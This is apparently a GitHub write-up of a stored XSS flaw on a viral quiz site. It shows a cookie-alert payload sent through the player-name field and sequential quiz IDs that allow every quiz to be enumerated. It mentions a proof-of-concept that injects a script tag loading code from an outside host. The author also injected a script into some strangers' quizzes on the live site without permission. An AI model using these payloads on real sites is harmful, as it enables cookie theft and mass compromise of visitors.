
<!-- ABOUT THE PROJECT -->
## How an XSS vulnerability could have led to javascript code execution on hundreds of thousands of users

### Introduction
Cross Site Scripting (XSS) exploits are often overlooked by developers even though they can present a serious threat to a web application. It is caused by improper sanitization of user input, which allows an attacker to run malicious client-side javascript code. A JS payload can steal cookies from unsuspecting users and send them to a C&C server, edit the website's content, or perform actions such as changing the password or email silently. XSS exploitation frameworks such as Beef can even perform browser exploits, collect information and perform DDOS attacks by creating a botnet of infected browsers.

https://user-images.githubusercontent.com/92279236/143231612-a99e550f-296a-48aa-bbea-25c5ee21e5c3.mp4

It all started when a friend sent me a link of this new quizzes site called q.fun-dare, which was quickly becoming viral among Instagram users. He sent me the link asking if I could make a bot for it like I have previously done with f3.cool, a similar website. 

![first_link](https://user-images.githubusercontent.com/92279236/143233850-0aa490e0-af92-4e2b-8920-92cfbbd12046.png)
(For later reference, the generated ID is 25074480)

</br>

### Finding the vulnerability

I initiated Nikto and Dirbuster scans, and then started messing around using Burp. After a few minutes I came across the submit quiz answers endpoint, which looks like the following:

![burp_answer_original](https://user-images.githubusercontent.com/92279236/143234385-b3bdcc64-10d1-44c1-8b3f-bc627b36cf0a.png)

</br>

Four parameters are being sent to the server, qid (Quiz ID), score (NÂº of correct answers), answerData (Selected responses) and pname (Player name). 
My first thought was to change the score to a negative number or an absurd amount such as 999999, and answerData to an empty array, and funnily enough the server accepted it as a valid request. 

![success](https://user-images.githubusercontent.com/92279236/143234891-a5ac4067-dea7-4e85-b893-7afcdecd46b1.png)

</br>

After these red flags I figured finding a vulnerability inside the code could actually be a realistic option, so I sent a request with the following code as the "pname" parameter: "<script>alert(document.cookie);</script>"

![burp_answer_modified](https://user-images.githubusercontent.com/92279236/143236580-553fee23-264a-47fe-b665-670f731a536c.png)

</br>

This was the result:
![documentcookie_popup](https://user-images.githubusercontent.com/92279236/143235899-6f3d3a8a-88f5-4cbe-9797-397f5391478b.png)

</br>

### Exploitation

Finding a stored XSS vulnerability within 5 minutes of pentesting shows the lack of awareness some developers have towards the potential risks of Cross Site Scriping vulnerabilities (to be fair, I believe some type of sanitizing is being done since this doesn't work if you do it without burp by typing the js in the name field). Since any quiz can be answered, I can also infect other people's questionnaires. I recognize I had some fun "hacking" my friends.

https://user-images.githubusercontent.com/92279236/143238026-71d6e648-c7f8-462c-9616-439bc3e9224f.mp4

</br>

Now it was a matter of finding out if I can actually find other quizzes to hack. I tried doing it manually, by adding 1 to my generated ID (25074480 + 1) but doing that didn't work, which led me to believe urls are generated randomly (as it should be). Since the website is pretty famous and IDs are only 8 numbers long, I figured I could bruteforce my way through it, so I created a simple python script.

![insecure_urls](https://user-images.githubusercontent.com/92279236/143264409-587a96e6-ee75-4ef1-9334-8523e4beadb6.png)

Did you notice a weird pattern? I definetly did not for more than an hour (to be fair it was 3 am)

That's right, URLs are not random like I previously thought, they're just generated by adding 18 to the last registered challenge ID. This just makes the XSS vulnerability much worse, since an attacker could easily exploit every challenge in the website. The amount of quizzes created since I started this pentesting can be calculated by doing 
(New ID generated - Old ID generated) / 18. 

Using this simple math I discovered that more than 400.000 quizzes had been created just in the past week, and I imagine even more users visit other people's quizzes. That is very impressive and at the same time scary

</br>

A malicious attacker could easily create a ddos botnet, prompt users to download malicious software, or create google/facebook fake login popups. I made a PoC script which automatically injects a <script src="mywebsite.com"></script> tag, used to load external javascript code. 

https://user-images.githubusercontent.com/92279236/143266952-e79e99d2-8d3c-4533-9d3c-52b80619d3c0.mp4

</br>

### Conclusion

Only a couple random quizzes were injected to test the vulnerability (A harlem shake script), but the potential attack vector is huge. I also noticed there seems to be no time delay when creating or submitting to quizzes, and captchas have not been implemented. This could lead to a DoS attack because of the relatively high amount of processing power required to generate them.

I contacted the website developer and am currently waiting for him to fix it, I'll update when he does.

Thanks for reading and remember to sanitize your input!

